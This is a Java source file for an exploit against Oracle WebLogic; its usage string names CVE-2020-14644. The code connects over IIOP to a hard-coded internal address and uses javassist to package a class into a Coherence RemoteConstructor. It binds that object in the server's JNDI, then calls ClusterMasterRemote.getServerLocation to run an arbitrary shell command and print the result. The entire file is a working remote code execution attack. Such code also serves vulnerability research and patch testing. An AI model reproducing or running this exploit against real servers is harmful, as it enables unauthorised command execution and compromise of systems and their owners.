package com.kami;

import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.jndi.Environment;

import javax.naming.Context;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class App {
    public static void main(String[] args) throws Exception {
        String host = "10.141.0.168";
        String port = "7001";
        String command = "ifconfig";
        Context iiopCtx = getInitialContext(host, port);
        try{
            iiopCtx.lookup("UnicodeSec");
        }catch (Exception e){
            ClassIdentity classIdentity = new ClassIdentity(com.kami.test.class);
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get(com.kami.test.class.getName());
            ctClass.replaceClassName(com.kami.test.class.getName(), com.kami.test.class.getName() + "$" + classIdentity.getVersion());
            RemoteConstructor constructor = new RemoteConstructor(
                    new ClassDefinition(classIdentity, ctClass.toBytecode()),
                    new Object[]{}
            );
            String bindName = "UnicodeSec" + System.nanoTime();
            iiopCtx.rebind(bindName, constructor);
        }
        executeCmdFromWLC(command, iiopCtx);
    }

    private static void printUsage() {
        System.out.println("usage: java -jar cve-2020-14644.jar host port command");
        System.exit(-1);
    }

    private static void executeCmdFromWLC(String command, Context iiopCtx) throws NamingException, RemoteException {
        ClusterMasterRemote remote = (ClusterMasterRemote) iiopCtx.lookup("UnicodeSec");
        String response = remote.getServerLocation(command);
        System.out.println(response);
    }

    public static Context getInitialContext(String host, String port) throws Exception {
        String url = converUrl(host, port);
        Environment environment = new Environment();
        environment.setProviderUrl(url);
        environment.setEnableServerAffinity(false);
        Context context = environment.getInitialContext();
        return context;
    }

    public static String converUrl(String host, String port) {
        return "iiop://" + host + ":" + port;
    }


}
